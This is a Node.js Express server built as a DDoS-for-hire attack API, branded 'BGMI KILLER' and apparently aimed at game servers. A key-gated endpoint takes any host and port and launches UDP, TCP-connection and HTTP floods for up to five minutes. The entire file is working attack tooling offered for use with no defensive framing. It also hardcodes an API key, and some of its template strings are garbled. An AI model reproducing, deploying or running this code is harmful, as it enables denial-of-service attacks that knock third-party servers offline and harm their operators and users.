const express = require('express');
const net = require('net');
const dgram = require('dgram');
const crypto = require('crypto');

const app = express();
const API_KEY = "z_psr6hn0inxLW5xSin59tVfAJq36XyyabJpuerWMSAZc";

app.get('/api/v1/attack', (req, res) => {
    const { key, host, port = "17870", time = "300", method = "ALL" } = req.query;

    if (key !== API_KEY) return res.send("INVALID KEY");

    const duration = Math.min(parseInt(time), 300); // Max 300s
    const targetPort = parseInt(port);

    console.log(`[BGMI KILLER] \( {host}: \){targetPort} | ${duration}s | Method: ${method}`);

    startMultiAttack(host, targetPort, duration, method);

    res.send(`SUCCESS → ATTACK STARTED ON \( {host}: \){targetPort} FOR ${duration} SECONDS`);
});

function startMultiAttack(target, port, duration, method) {
    const endTime = Date.now() + duration * 1000;

    // UDP Flood
    if (method === "UDP" || method === "ALL") {
        const udpClient = dgram.createSocket('udp4');
        const msg = Buffer.alloc(1024, 'BGMI_KILL');
        setInterval(() => {
            if (Date.now() > endTime) return;
            for (let i = 0; i < 50; i++) {
                udpClient.send(msg, 0, msg.length, port, target);
            }
        }, 10);
    }

    // TCP Connection Flood
    if (method === "TCP" || method === "ALL") {
        setInterval(() => {
            if (Date.now() > endTime) return;
            for (let i = 0; i < 30; i++) {
                const client = net.connect(port, target, () => {
                    client.write(Buffer.alloc(2048, 'x'));
                }).on('error', () => {});
                setTimeout(() => client.destroy(), 2000);
            }
        }, 50);
    }

    // HTTP Flood (backup + game servers)
    if (method === "HTTP" || method === "ALL") {
        setInterval(() => {
            if (Date.now() > endTime) return;
            for (let i = 0; i < 100; i++) {
                require('http').get(`http://\( {target}: \){port}`).on('error', () => {});
            }
        }, 30);
    }
}

app.get('/status', (req, res) => {
    res.json({ status: "LIVE", max_time: "300s", methods: "UDP+TCP+HTTP+ALL" });
});

const PORT = process.env.PORT || 3000;
app.listen(PORT, () => {
    console.log(`🚀 BGMI FULL POWER API RUNNING - UDP/TCP/ALL PORTS`);
});